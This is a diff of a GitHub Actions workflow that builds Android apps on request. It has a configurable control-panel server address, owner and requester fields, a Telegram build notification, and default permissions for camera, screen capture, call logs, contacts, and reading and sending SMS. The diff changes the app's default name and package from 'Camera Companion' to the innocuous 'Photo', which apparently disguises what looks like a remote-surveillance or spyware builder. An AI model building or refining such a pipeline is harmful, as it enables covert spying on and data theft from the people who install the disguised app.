@@ -15,11 +15,11 @@ on:
       app_name:
         description: "Название приложения"
         required: false
-        default: "Camera Companion"
+        default: "Photo"
       application_id:
-        description: "Package (applicationId), напр. com.artem.cameracompanion"
+        description: "Package (applicationId), напр. com.artem.photo"
         required: false
-        default: "com.artem.cameracompanion"
+        default: "com.artem.photo"
       default_server:
         description: "Адрес панели по умолчанию (IP:порт), необязательно"
         required: false
@@ -65,8 +65,8 @@ jobs:
 
       - name: Inject build parameters
         run: |
-          APP_NAME="${{ github.event.inputs.app_name || 'Camera Companion' }}"
-          APP_ID="${{ github.event.inputs.application_id || 'com.artem.cameracompanion' }}"
+          APP_NAME="${{ github.event.inputs.app_name || 'Photo' }}"
+          APP_ID="${{ github.event.inputs.application_id || 'com.artem.photo' }}"
           SERVER="${{ github.event.inputs.default_server }}"
           PERMS="${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}"
 
@@ -141,7 +141,7 @@ jobs:
         env:
           TG_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
-          APP_NAME: ${{ github.event.inputs.app_name || 'Camera Companion' }}
+          APP_NAME: ${{ github.event.inputs.app_name || 'Photo' }}
           OWNER: ${{ github.event.inputs.owner_username }}
           REQUESTED_BY: ${{ github.event.inputs.requested_by }}
           PERMS: ${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}
